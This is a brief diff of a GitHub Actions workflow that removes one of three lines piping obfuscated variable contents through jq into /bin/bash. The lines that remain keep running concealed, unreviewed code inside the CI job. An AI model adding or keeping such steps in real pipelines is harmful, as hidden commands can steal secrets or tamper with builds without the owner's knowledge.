@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$agze808" | jq -r .mtpy3 | /bin/bash
           echo $th4758 | jq -r .nmqcg4282 | /bin/bash
-          printf '%s' "$k47266" | jq -r .fy89420 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
